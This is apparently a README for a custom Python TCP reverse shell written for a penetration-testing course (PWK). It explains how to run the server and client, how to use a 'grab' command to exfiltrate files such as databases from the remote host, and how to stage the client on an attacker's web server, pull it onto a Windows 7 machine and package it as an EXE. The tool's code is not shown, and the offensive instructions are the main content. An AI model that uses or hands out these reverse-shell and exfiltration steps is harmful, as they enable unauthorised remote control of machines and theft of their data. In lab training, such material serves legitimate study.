Custom Python TCP reverse Shell

two main files

1. ClientTCPreverseShell
2. ServerTCPreverseShell

Edit the ip address and ports within the client and server before using. 

I am currently adding modules but they are not being used yet. 

usage
command line run >>> python ServerTCPreverseShell.py
command line run >>> python ClientTCPreverseShell.py

From shell start the server first then start the client. 

$$$> python ServerTCPReverseShell.py

$$$> python ClientTCPreverseShell.py

The server will have to be run from command line however the client can be run from Gui or commandline

The server shell on the linux side will start with a /bin/sh -i
I am currently working on changing shells and tab completing.  

--help && --commands

TO Exfil data
Shell> grab*exfil_data.txt
This command will grab the file you want and save it to your local desktop as a .txt file

Step1 for grab command
You will have to rename the .txt file to whatever suffix you downloaded from the remote hose.
Example. The command below will grab the database and copy it to your local desktop as a .txt file
Shell>grab*exfil_database.sdf

step2 for grab command
Just rename the .txt file to the proper suffix 
Shell>> cp exfil_database.txt exfil_database.sdf


TO get the environment
Shel> getenv
This will print the platform details

TO get the User ID
Shell>getuid

Notes below are for use with PWK course

You can upload the client to the windows 7 workstation in order to convert to exe
Before you start you will want to zip up the client and move to your web folder. 

step 1
move the client to your /var/www/html folder

step2 
start the apache2 webserver

step3 
remote desktop into the windows 7 box

step4 
browse to your attacker machine through internet explorer
http://ipaddress/ClientTCPrevshell.py

step5
upload the pyexe program to the windows 7 server in the same fashion. 

You can convert Client to exe format. 
Convert "ClientTCPrevshell" to EXE format. 
Get py2exe for windows and make sure to get the correct python versian.
https://sourceforge.net/projects/py2exe/files/py2exe/0.6.9/
copy to your var/www/html folder and upload to your windows 7 machine.

Install py2exe and then move the py2exe program into the same folder as 
ClientTCPreverseShell and setup.py

Edit setup.py with idle by right clicking and edit with idle. 

then run module

then test your new custom python exe shell. Copy the exe from the "dist" folder
to the desktop and start the server on kali.

next you will want to bring your .exe file back to the local kali attacker workstation. 
To do this you will just use the custom TCP Shell to grab your exe and move it back to the host. 

Step one
zip up your new custom EXE python shell and from the python server on kali

Shell> grab*Clientshell.zip

now go to your desktop and rename test.txt to ClientShell.zip

Works for me and will work for you!!!


to help with the project fork project and add a new branch. I will merge the requests. 
https://code.tutsplus.com/articles/team-collaboration-with-github--net-29876
$ git clone [ssh-url] [folder-name]
$ cd [folder-name]
$ git checkout -b [new-feature]
$ git add .
$ git commit -m "information added in readme"
$ git checkout master
e will push the branch to the remote repository. For this we will first check the branch name with the new feature as well as the git
remote repository aliases. Then we will push the changes using
$git push [git-remote-alias] [branch-name]:
$ git branch
* master
readme
$ git remote -v
origin  git@github.com:[forked-repo-owner-username]/[repo-name].git (fetch)
origin  git@github.com:[forked-repo-owner-username]/[repo-name].git (push)
$ git push origin readme




